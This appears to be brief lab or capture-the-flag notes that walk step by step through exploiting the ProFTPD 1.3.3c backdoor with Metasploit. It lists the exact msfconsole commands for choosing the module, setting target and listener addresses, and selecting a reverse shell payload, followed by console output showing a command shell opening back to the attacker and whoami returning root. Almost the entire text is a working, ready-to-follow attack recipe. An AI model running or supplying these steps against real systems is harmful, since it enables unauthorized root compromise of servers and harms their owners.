# exploit msf-proftpd-rce-root

1. `$ msfconsole`
2. `msf6 > search ProFTPD`
3. `msf6 > use exploit/unix/ftp/proftpd_133c_backdoor`
4. `msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set rhost 172.21.208.156`
5. `msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads`

```
Compatible Payloads
===================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
```

6. `msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload payload/cmd/unix/reverse`
7. `msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set lhost 172.21.215.12`
8. `msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options`

```
Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  172.21.208.156   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
                                      Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.21.215.12    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
```

9. `msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit`

```
[*] Started reverse TCP double handler on 172.21.215.12:4444 
[*] 172.21.208.156:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Ll2BMp3MLYaaLUuL;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "Ll2BMp3MLYaaLUuL\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.21.215.12:4444 -> 172.21.208.156:43142) at ...
```

10. `whoami`

```
root
```
